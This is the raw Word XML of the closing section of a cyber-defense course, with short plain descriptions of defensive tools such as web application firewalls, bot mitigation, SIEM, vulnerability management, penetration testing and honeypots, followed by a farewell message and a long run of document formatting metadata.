    <w:p w14:paraId="49B960D7" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRPr="00DF3303" w:rsidRDefault="003D18FA" w:rsidP="00DF3303">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DF3303">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Web Application Firewalls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C50367" w14:textId="461AA376" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="00DF3303">
      <w:r>
        <w:t xml:space="preserve">A web application firewall filters, monitors, and blocks HTTP traffic to and from a web application. A WAF is differentiated from a regular firewall in that a WAF </w:t>
      </w:r>
      <w:r w:rsidR="00DA0957">
        <w:t>can</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> filter the content of specific web applications</w:t>
      </w:r>
      <w:r w:rsidR="00172301">
        <w:t>. In contrast,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00172301">
        <w:t>typical</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> firewalls serve as a safety gate by blocking IPs/ports. A WAF can stop denial o</w:t>
      </w:r>
      <w:r w:rsidR="00172301">
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> service attack</w:t>
      </w:r>
      <w:r w:rsidR="00172301">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>, can block users of specific geographic area</w:t>
      </w:r>
      <w:r w:rsidR="00172301">
        <w:t>s,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and many other things using </w:t>
      </w:r>
      <w:r w:rsidR="00DF3303">
        <w:t>sophisticated</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> rules. Imperva WAF is a popular tool for this purpose. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C206475" w14:textId="1C9FFB7B" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="00DF3303">
      <w:r>
        <w:t xml:space="preserve">In </w:t>
      </w:r>
      <w:r w:rsidR="00172301">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t>case of distributed denial of service attack</w:t>
      </w:r>
      <w:r w:rsidR="00172301">
        <w:t>s,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00172301">
        <w:t>even a WAF is not enough</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The problem is there </w:t>
      </w:r>
      <w:r w:rsidR="004A6B08">
        <w:t>are</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> two kind</w:t>
      </w:r>
      <w:r w:rsidR="00172301">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of bots - good bots and bad bots. </w:t>
      </w:r>
      <w:r w:rsidR="004A6B08">
        <w:t>Search engines deploy good bot</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s like google, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>bing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004A6B08">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> etc. to crawl your site and index your pages for search results. </w:t>
      </w:r>
      <w:r w:rsidR="004A6B08">
        <w:t>The hackers deploy bad bot</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s. An </w:t>
      </w:r>
      <w:r w:rsidR="00DF3303">
        <w:t>organization</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> should entertain good bots and block bad bots. This is hard to do. In those </w:t>
      </w:r>
      <w:r w:rsidR="00FA4C25">
        <w:t>cases,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tools are needed to identify the </w:t>
      </w:r>
      <w:r w:rsidR="00DF3303">
        <w:t>signature</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of the bad bots. Tools like Distill from Distill Network can be used to protect from bad bots. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51BA8E68" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRPr="00DF3303" w:rsidRDefault="003D18FA" w:rsidP="00DF3303">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DF3303">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerability Management</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF60491" w14:textId="53C64C43" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="00DF3303">
      <w:r>
        <w:t xml:space="preserve">Vulnerabilities of servers and networks pop up regularly. Companies need </w:t>
      </w:r>
      <w:r w:rsidR="004A6B08">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:t>tool to discover them, prioritize them and finally confirm that exposure has been remediated. Nexpose, Rapid7</w:t>
      </w:r>
      <w:r w:rsidR="00223BBA">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CF1923">
        <w:lastRenderedPageBreak/>
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> vulnerability management software that monitors exposures in real-time and adapts to new threats with fresh data, ensuring you companies always act before the impact.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="051A383F" w14:textId="77777777" w:rsidR="00F25AA8" w:rsidRDefault="00F25AA8" w:rsidP="00F25AA8">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>BOT Detection and Mitigation Software</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59EC8F3E" w14:textId="38ED77AD" w:rsidR="00F25AA8" w:rsidRPr="00F25AA8" w:rsidRDefault="00F25AA8" w:rsidP="00F25AA8">
      <w:r>
        <w:t xml:space="preserve">This type of software </w:t>
      </w:r>
      <w:r w:rsidRPr="00F25AA8">
        <w:t>identif</w:t>
      </w:r>
      <w:r>
        <w:t>ies</w:t>
      </w:r>
      <w:r w:rsidRPr="00F25AA8">
        <w:t xml:space="preserve"> bot activity on a website and prevent</w:t>
      </w:r>
      <w:r w:rsidR="00CF1923">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00F25AA8">
        <w:t xml:space="preserve"> scraping, fraud</w:t>
      </w:r>
      <w:r w:rsidR="00CF1923">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00F25AA8">
        <w:t xml:space="preserve"> and other security issues.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> The software</w:t>
      </w:r>
      <w:r w:rsidRPr="00F25AA8">
        <w:t xml:space="preserve"> tracks the traffic to a website and sorts them by actual human users, good </w:t>
      </w:r>
      <w:r>
        <w:t>BOT</w:t>
      </w:r>
      <w:r w:rsidRPr="00F25AA8">
        <w:t xml:space="preserve">s, bad </w:t>
      </w:r>
      <w:r>
        <w:t>BOT</w:t>
      </w:r>
      <w:r w:rsidRPr="00F25AA8">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>. It then blocks bad bots and allows the rest. Distil Networks is such a BOT management software.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63402CDD" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRPr="00DF3303" w:rsidRDefault="003D18FA" w:rsidP="00DF3303">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DF3303">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Security information and event management (SIEM) product</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30061757" w14:textId="74AF0C8F" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="00DF3303">
      <w:r>
        <w:t>Essentially a SIEM software is a</w:t>
      </w:r>
      <w:r w:rsidR="00FA4C25">
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> application log monitoring system. It </w:t>
      </w:r>
      <w:r w:rsidR="00DF3303">
        <w:t>collects</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and aggregates log data generated throughout the organization's technology infrastructure, from host systems and applications to network and security devices such as firewalls and antivirus filters and alerts when malicious activities are detected. IBM's QRADAR is a popular SIEM tool that </w:t>
      </w:r>
      <w:r w:rsidR="00CF1923">
        <w:t>companies use</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74BA4483" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRPr="00DF3303" w:rsidRDefault="003D18FA" w:rsidP="00DF3303">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DF3303">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Penetration Testing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E3429D" w14:textId="6C6AA845" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="00DF3303">
      <w:r>
        <w:t>A penetration test, otherwise known as a pen test, is an authorized simulated cyber-attack on a computer system performed to evaluate the s</w:t>
      </w:r>
      <w:r w:rsidR="00CF1923">
        <w:t>ystem's security</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Netragard</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is a popular pen</w:t>
      </w:r>
      <w:r w:rsidR="00CF1923">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>testing platform.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317F3F9A" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRPr="00DF3303" w:rsidRDefault="003D18FA" w:rsidP="00DF3303">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DF3303">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Security Scoring Platform</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79B7C41E" w14:textId="1347DCAA" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="00DF3303">
      <w:r>
        <w:t xml:space="preserve">Like </w:t>
      </w:r>
      <w:r w:rsidR="00CF1923">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:t>credit score, there are companies now rating security score</w:t>
      </w:r>
      <w:r w:rsidR="00CF1923">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for other companies.  These Security Scoring </w:t>
      </w:r>
      <w:r w:rsidR="00CF1923">
        <w:t>platforms</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> typically give companies security score</w:t>
      </w:r>
      <w:r w:rsidR="00CF1923">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and provide reports about the details of the score. Based on the report</w:t>
      </w:r>
      <w:r w:rsidR="00CF1923">
        <w:t>ing</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> company rectify security concerns to increase security rating.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19EBB68D" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRPr="00DF3303" w:rsidRDefault="003D18FA" w:rsidP="00DF3303">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DF3303">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Honeypot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02C6F83F" w14:textId="46E9230D" w:rsidR="00712EAF" w:rsidRDefault="003D18FA" w:rsidP="00DF3303">
      <w:r>
        <w:t xml:space="preserve">A honeypot is a computer intended to mimic likely targets of cyberattacks. It can be used to detect attacks or deflect them from a legitimate target. It can also be used to gain information about how cybercriminals operate. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ThreadStrike</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Attivo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is a tool to set</w:t>
      </w:r>
      <w:r w:rsidR="00CF1923">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">up such Honeypots. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="262E4522" w14:textId="77777777" w:rsidR="00DF3303" w:rsidRDefault="00DF3303" w:rsidP="00DF3303"/>
    <w:p w14:paraId="581EDE54" w14:textId="42DEE624" w:rsidR="00C107E0" w:rsidRPr="005B49BA" w:rsidRDefault="002F274E" w:rsidP="00712EAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B49BA">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">This is the end of this course. It is an honor to work with you on such a complex topic as cyber defense. I hope we all learned </w:t>
      </w:r>
      <w:r w:rsidR="00673847" w:rsidRPr="005B49BA">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>few</w:t>
      </w:r>
      <w:r w:rsidRPr="005B49BA">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> things and</w:t>
      </w:r>
      <w:r w:rsidR="003E5D93">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> are well equipped to</w:t>
      </w:r>
      <w:r w:rsidR="00673847" w:rsidRPr="005B49BA">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> advance our knowledge </w:t>
      </w:r>
      <w:r w:rsidR="003E5D93">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>on the subject</w:t>
      </w:r>
      <w:r w:rsidRPr="005B49BA">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>. Thank you all.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00C107E0" w:rsidRPr="005B49BA">
      <w:footerReference w:type="default" r:id="rId15"/>
      <w:headerReference w:type="first" r:id="rId16"/>
      <w:footerReference w:type="first" r:id="rId1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3E73" w14:textId="77777777" w:rsidR="007A3129" w:rsidRDefault="007A3129">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="55839FD0" w14:textId="77777777" w:rsidR="007A3129" w:rsidRDefault="007A3129"/>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="74568BCE" w14:textId="77777777" w:rsidR="007A3129" w:rsidRDefault="007A3129">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="373E410B" w14:textId="77777777" w:rsidR="007A3129" w:rsidRDefault="007A3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6373170"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706C3B"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6FE5136F" w14:textId="77777777" w:rsidR="00CE68A6" w:rsidRDefault="00CE68A6" w:rsidP="00B65A68">
            <w:pPr>
              <w:pStyle w:val="Footer"/>
              <w:pBdr>
                <w:top w:val="single" w:sz="4" w:space="0" w:color="0072C6" w:themeColor="accent1"/>
              </w:pBdr>
            </w:pPr>
            <w:r>
              <w:t>Mohammed Rahman</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4227711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7E2ABBF2"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A8F19" w14:textId="77777777" w:rsidR="007A3129" w:rsidRDefault="007A3129">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="44A063E9" w14:textId="77777777" w:rsidR="007A3129" w:rsidRDefault="007A3129"/>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="3962C38F" w14:textId="77777777" w:rsidR="007A3129" w:rsidRDefault="007A3129">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF50AEF" w14:textId="77777777" w:rsidR="007A3129" w:rsidRDefault="007A31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95AF"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5" name="Picture 5"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81850" w14:textId="77777777" w:rsidR="00CE68A6" w:rsidRDefault="00CE68A6">
    <w:pPr>
      <w:pStyle w:val="Header"/>
    </w:pPr>
  </w:p>
  <w:p w14:paraId="6FB9A8AD" w14:textId="77777777" w:rsidR="00CE68A6" w:rsidRDefault="00CE68A6">
    <w:pPr>
      <w:pStyle w:val="Header"/>
    </w:pPr>
  </w:p>
  <w:p w14:paraId="4088D92D" w14:textId="77777777" w:rsidR="00CE68A6" w:rsidRDefault="00CE68A6">
    <w:pPr>
      <w:pStyle w:val="Header"/>
    </w:pPr>
  </w:p>
  <w:p w14:paraId="5D007594"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75AB8D9F"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51650B51"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4223FD">
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
        <w:color w:val="000000"/>
        <w:sz w:val="36"/>
        <w:szCs w:val="36"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
      </w:rPr>
      <w:t>4</w:t>
    </w:r>
  </w:p>
  <w:p w14:paraId="2C6FF453"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418E0077" wp14:editId="7FB4A361">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CE43D"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05pt" to="60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strokecolor="#0072c6 [3204]" strokeweight=".5pt">
              <v:stroke joinstyle="miter"/>
              <w10:wrap anchorx="page"/>
            </v:line>
          </w:pict>
        </mc:Fallback>
      </mc:AlternateContent>
    </w:r>
  </w:p>
  <w:p w14:paraId="5DFCDC1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500EB"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="409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5303A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="EDA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D2C26"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C0A63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D37F2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9664E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9E4409"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5F48D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A3761"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D69A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A3D4B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="BEAE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28"/>
  </w:num>
  <w:num w:numId="5">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="6">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="8">
    <w:abstractNumId w:val="42"/>
  </w:num>
  <w:num w:numId="9">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="10">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="11">
    <w:abstractNumId w:val="2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42"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="22">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="23">
    <w:abstractNumId w:val="43"/>
  </w:num>
  <w:num w:numId="24">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="25">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="26">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="27">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="28">
    <w:abstractNumId w:val="37"/>
  </w:num>
  <w:num w:numId="29">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="30">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="31">
    <w:abstractNumId w:val="39"/>
  </w:num>
  <w:num w:numId="32">
    <w:abstractNumId w:val="36"/>
  </w:num>
  <w:num w:numId="33">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="34">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="35">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="36">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="37">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="38">
    <w:abstractNumId w:val="41"/>
  </w:num>
  <w:num w:numId="39">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="40">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="41">
    <w:abstractNumId w:val="40"/>
  </w:num>
  <w:num w:numId="42">
    <w:abstractNumId w:val="44"/>
  </w:num>
  <w:num w:numId="43">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="44">
    <w:abstractNumId w:val="30"/>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sTQ1M7Q0MDM1MTFV0lEKTi0uzszPAykwqQUAcCW43CwAAAA="/>
  </w:docVars>
  <w:rsids>
    <w:rsidRoot w:val="00EE1768"/>
    <w:rsid w:val="00002B5E"/>
    <w:rsid w:val="00005075"/>
    <w:rsid w:val="0000795A"/>
    <w:rsid w:val="00007EBB"/>
    <w:rsid w:val="00012020"/>
    <w:rsid w:val="000144FF"/>
    <w:rsid w:val="00017447"/>
    <w:rsid w:val="00017EC9"/>
    <w:rsid w:val="0002099F"/>
    <w:rsid w:val="00026FA8"/>
    <w:rsid w:val="00027D4D"/>
    <w:rsid w:val="00027D9D"/>
    <w:rsid w:val="000323AD"/>
    <w:rsid w:val="00036FCA"/>
    <w:rsid w:val="0004208C"/>
    <w:rsid w:val="0004643C"/>
    <w:rsid w:val="00055411"/>
    <w:rsid w:val="00056069"/>
    <w:rsid w:val="0005641E"/>
    <w:rsid w:val="00056534"/>
    <w:rsid w:val="00064152"/>
    <w:rsid w:val="00070325"/>
    <w:rsid w:val="00070812"/>
    <w:rsid w:val="00071855"/>
    <w:rsid w:val="00081C28"/>
    <w:rsid w:val="0009625E"/>
    <w:rsid w:val="000A029E"/>
    <w:rsid w:val="000B3EA3"/>
    <w:rsid w:val="000C0F6D"/>
    <w:rsid w:val="000C6441"/>
    <w:rsid w:val="000D53EF"/>
    <w:rsid w:val="000E50B4"/>
    <w:rsid w:val="000F054D"/>
    <w:rsid w:val="000F21E7"/>
    <w:rsid w:val="000F660D"/>
    <w:rsid w:val="000F7F8F"/>
    <w:rsid w:val="00110E3B"/>
    <w:rsid w:val="00113CA0"/>
    <w:rsid w:val="001148C6"/>
    <w:rsid w:val="00115C67"/>
    <w:rsid w:val="001219AB"/>
    <w:rsid w:val="00131BA8"/>
    <w:rsid w:val="001353D4"/>
    <w:rsid w:val="0014062B"/>
    <w:rsid w:val="001436C5"/>
    <w:rsid w:val="00147A1C"/>
    <w:rsid w:val="00151BC8"/>
    <w:rsid w:val="00151D65"/>
    <w:rsid w:val="001531AE"/>
    <w:rsid w:val="00160545"/>
    <w:rsid w:val="001627F1"/>
    <w:rsid w:val="00163D3B"/>
    <w:rsid w:val="00165178"/>
    <w:rsid w:val="00165989"/>
    <w:rsid w:val="00166D02"/>
    <w:rsid w:val="00167466"/>
    <w:rsid w:val="00172301"/>
    <w:rsid w:val="00173B13"/>
    <w:rsid w:val="00180ECB"/>
    <w:rsid w:val="00184527"/>
    <w:rsid w:val="001A50EF"/>
    <w:rsid w:val="001A51BC"/>
    <w:rsid w:val="001B48D8"/>
    <w:rsid w:val="001C2278"/>
    <w:rsid w:val="001C4853"/>
    <w:rsid w:val="001D1A3B"/>
    <w:rsid w:val="001D1BD0"/>
    <w:rsid w:val="001D7B71"/>
    <w:rsid w:val="001E1F9E"/>
    <w:rsid w:val="001E2D74"/>
    <w:rsid w:val="001E60E5"/>
    <w:rsid w:val="001F206E"/>
    <w:rsid w:val="001F3371"/>
    <w:rsid w:val="001F55A0"/>
    <w:rsid w:val="002034B8"/>
    <w:rsid w:val="002133FC"/>
    <w:rsid w:val="00216FE3"/>
    <w:rsid w:val="0021718F"/>
    <w:rsid w:val="00223BBA"/>
    <w:rsid w:val="00224190"/>
    <w:rsid w:val="00224B43"/>
    <w:rsid w:val="00227C7C"/>
    <w:rsid w:val="00227DF5"/>
    <w:rsid w:val="00232588"/>
    <w:rsid w:val="0023523C"/>
    <w:rsid w:val="00237CFF"/>
    <w:rsid w:val="00243191"/>
    <w:rsid w:val="0025045B"/>
    <w:rsid w:val="00255594"/>
    <w:rsid w:val="00256592"/>
    <w:rsid w:val="00256F7F"/>
    <w:rsid w:val="00266C03"/>
    <w:rsid w:val="002701D5"/>
    <w:rsid w:val="00273678"/>
    <w:rsid w:val="002807F5"/>
    <w:rsid w:val="0029604A"/>
    <w:rsid w:val="002A0D22"/>
    <w:rsid w:val="002B024C"/>
    <w:rsid w:val="002C1124"/>
    <w:rsid w:val="002D01FC"/>
    <w:rsid w:val="002D22E0"/>
    <w:rsid w:val="002E4221"/>
    <w:rsid w:val="002F1577"/>
    <w:rsid w:val="002F221A"/>
    <w:rsid w:val="002F274E"/>
    <w:rsid w:val="002F65B7"/>
    <w:rsid w:val="003008EC"/>
    <w:rsid w:val="00301257"/>
    <w:rsid w:val="00301A71"/>
    <w:rsid w:val="00302BEC"/>
    <w:rsid w:val="003059B9"/>
    <w:rsid w:val="003065AA"/>
    <w:rsid w:val="003069E5"/>
    <w:rsid w:val="00307A99"/>
    <w:rsid w:val="0031099C"/>
    <w:rsid w:val="003112E5"/>
    <w:rsid w:val="00311B63"/>
    <w:rsid w:val="00316AFD"/>
    <w:rsid w:val="003237BA"/>
    <w:rsid w:val="0032681B"/>
    <w:rsid w:val="00327B51"/>
    <w:rsid w:val="003321DC"/>
    <w:rsid w:val="0033348D"/>
    <w:rsid w:val="00345032"/>
    <w:rsid w:val="00347DED"/>
    <w:rsid w:val="00352773"/>
    <w:rsid w:val="00354BCC"/>
    <w:rsid w:val="0036035B"/>
    <w:rsid w:val="00361215"/>
    <w:rsid w:val="0036146D"/>
    <w:rsid w:val="00363F4B"/>
    <w:rsid w:val="00364268"/>
    <w:rsid w:val="003678C7"/>
    <w:rsid w:val="00371752"/>
    <w:rsid w:val="00382025"/>
    <w:rsid w:val="00384BCE"/>
    <w:rsid w:val="0038517D"/>
    <w:rsid w:val="0039435D"/>
    <w:rsid w:val="00394EAA"/>
    <w:rsid w:val="00395A75"/>
    <w:rsid w:val="003968F0"/>
    <w:rsid w:val="003A06C3"/>
    <w:rsid w:val="003A0990"/>
    <w:rsid w:val="003A1275"/>
    <w:rsid w:val="003A3F8A"/>
    <w:rsid w:val="003A5D78"/>
    <w:rsid w:val="003B0341"/>
    <w:rsid w:val="003B09EB"/>
    <w:rsid w:val="003B33DC"/>
    <w:rsid w:val="003B7CC0"/>
    <w:rsid w:val="003C1DCD"/>
    <w:rsid w:val="003C2F86"/>
    <w:rsid w:val="003C4547"/>
    <w:rsid w:val="003D023E"/>
    <w:rsid w:val="003D0D00"/>
    <w:rsid w:val="003D18FA"/>
    <w:rsid w:val="003D49F5"/>
    <w:rsid w:val="003D547F"/>
    <w:rsid w:val="003E5D44"/>
    <w:rsid w:val="003E5D93"/>
    <w:rsid w:val="003E7508"/>
    <w:rsid w:val="003E7523"/>
    <w:rsid w:val="003E7AAC"/>
    <w:rsid w:val="003F11D6"/>
    <w:rsid w:val="003F2CA3"/>
    <w:rsid w:val="003F57B3"/>
    <w:rsid w:val="00412566"/>
    <w:rsid w:val="00414089"/>
    <w:rsid w:val="00420042"/>
    <w:rsid w:val="0042184F"/>
    <w:rsid w:val="004223FD"/>
    <w:rsid w:val="00426A46"/>
    <w:rsid w:val="00426D2A"/>
    <w:rsid w:val="004300EA"/>
    <w:rsid w:val="00432D89"/>
    <w:rsid w:val="00443B39"/>
    <w:rsid w:val="00444042"/>
    <w:rsid w:val="004466FF"/>
    <w:rsid w:val="00450506"/>
    <w:rsid w:val="004510BF"/>
    <w:rsid w:val="00454A1C"/>
    <w:rsid w:val="0045533A"/>
    <w:rsid w:val="00460B2F"/>
    <w:rsid w:val="004630A7"/>
    <w:rsid w:val="004675B7"/>
    <w:rsid w:val="00476C33"/>
    <w:rsid w:val="00483A00"/>
    <w:rsid w:val="00484B43"/>
    <w:rsid w:val="00486F4D"/>
    <w:rsid w:val="004A28B3"/>
    <w:rsid w:val="004A52D8"/>
    <w:rsid w:val="004A6B08"/>
    <w:rsid w:val="004B671B"/>
    <w:rsid w:val="004C0BE7"/>
    <w:rsid w:val="004C400D"/>
    <w:rsid w:val="004C6140"/>
    <w:rsid w:val="004C61AC"/>
    <w:rsid w:val="004C7F4E"/>
    <w:rsid w:val="004D2573"/>
    <w:rsid w:val="004D664C"/>
    <w:rsid w:val="004E22D7"/>
    <w:rsid w:val="004E2A96"/>
    <w:rsid w:val="004E6A45"/>
    <w:rsid w:val="004F2ADD"/>
    <w:rsid w:val="004F3533"/>
    <w:rsid w:val="004F3718"/>
    <w:rsid w:val="004F53AC"/>
    <w:rsid w:val="00501648"/>
    <w:rsid w:val="0050362E"/>
    <w:rsid w:val="00507CEC"/>
    <w:rsid w:val="00511AD1"/>
    <w:rsid w:val="00515FE5"/>
    <w:rsid w:val="00520F78"/>
